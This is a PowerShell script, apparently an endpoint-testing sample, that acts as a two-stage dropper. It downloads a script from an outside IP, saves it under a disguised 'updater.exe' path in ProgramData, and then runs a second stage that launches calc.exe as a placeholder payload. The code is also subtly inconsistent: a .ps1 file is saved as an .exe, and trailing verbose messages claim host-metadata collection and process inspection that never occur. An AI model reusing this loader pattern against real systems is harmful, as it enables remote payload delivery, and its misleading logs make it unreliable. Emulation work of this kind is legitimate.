<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://203.0.113.138:443/stage1.ps1',
    [string]$LocalPath = "C:\ProgramData\updater.exe",
    [string]$TracePath = "$env:TEMP\stage.log",
    [int]$TransferTimeout = 200
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 200
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $FetchResult = Invoke-Stage1Download -SourceUrl $FetchUrl -DestinationPath $LocalPath -TimeoutSec $TransferTimeout
    if ($FetchResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $LocalPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $FetchUrl
    Destination = $LocalPath
    TimeoutSec = $TransferTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Validating result"
Write-Verbose "Reading configuration values"
Write-Verbose "Exporting operation report"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Collecting host metadata"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Checking local path"
Write-Verbose "Starting workflow"
Write-Verbose "Stage handoff finished"
Write-Verbose "Inspecting process list"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
